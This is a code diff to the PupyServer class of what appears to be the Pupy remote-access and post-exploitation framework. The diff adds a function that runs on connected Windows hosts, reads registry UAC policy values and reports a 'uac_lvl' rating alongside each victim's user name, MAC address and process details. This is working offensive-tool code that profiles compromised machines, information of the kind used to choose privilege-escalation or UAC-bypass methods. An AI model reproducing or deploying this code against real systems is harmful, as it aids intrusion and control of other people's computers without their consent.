@@ -87,7 +87,30 @@ class PupyServer(threading.Thread):
         import sys
         import os
         import locale
+        from _winreg import *
         os_encoding = locale.getpreferredencoding() or "utf8"
+
+        def getUACLevel():
+            i, consentPromptBehaviorAdmin, enableLUA, promptOnSecureDesktop = 0, None, None, None
+            try:
+                Registry = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
+                RawKey = OpenKey(Registry, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
+            except:
+                    return "?"
+            while True:
+                try:  
+                    name, value, type = EnumValue(RawKey, i)
+                    if name == "ConsentPromptBehaviorAdmin": consentPromptBehaviorAdmin = value
+                    elif name == "EnableLUA": enableLUA = value
+                    elif name == "PromptOnSecureDesktop": promptOnSecureDesktop = value
+                    i+=1
+                except WindowsError:
+                    break
+            if consentPromptBehaviorAdmin == 2 and enableLUA == 1 and promptOnSecureDesktop == 1: return "3/3"
+            elif consentPromptBehaviorAdmin == 5 and enableLUA == 1 and promptOnSecureDesktop == 1: return "2/3"
+            elif consentPromptBehaviorAdmin == 5 and enableLUA == 1 and promptOnSecureDesktop == 0: return "1/3"
+            elif enableLUA == 0: return "0/3"
+            else: return "?"
 
         def GetUserName():
             from ctypes import windll, WinError, create_string_buffer, byref, c_uint32, GetLastError
@@ -167,7 +190,7 @@ class PupyServer(threading.Thread):
                 macaddr=':'.join(("%012X" % macaddr)[i:i+2] for i in range(0, 12, 2))
             except Exception:
                 pass
-            return (user, node, plat, release, version, machine, macaddr, pid, proc_arch, proc_path)
+            return (user, node, plat, release, version, machine, macaddr, pid, proc_arch, proc_path, getUACLevel())
             """))
         l=conn.namespace["get_uuid"]()
         
@@ -185,6 +208,7 @@ class PupyServer(threading.Thread):
                 "exec_path" : l[9],
                 "macaddr" : l[6],
                 "pid" : l[7],
+                "uac_lvl" : l[10],
                 "address" : conn._conn._config['connid'].rsplit(':',1)[0],
                 "launcher" : conn.get_infos("launcher"),
                 "launcher_args" : obtain(conn.get_infos("launcher_args")),
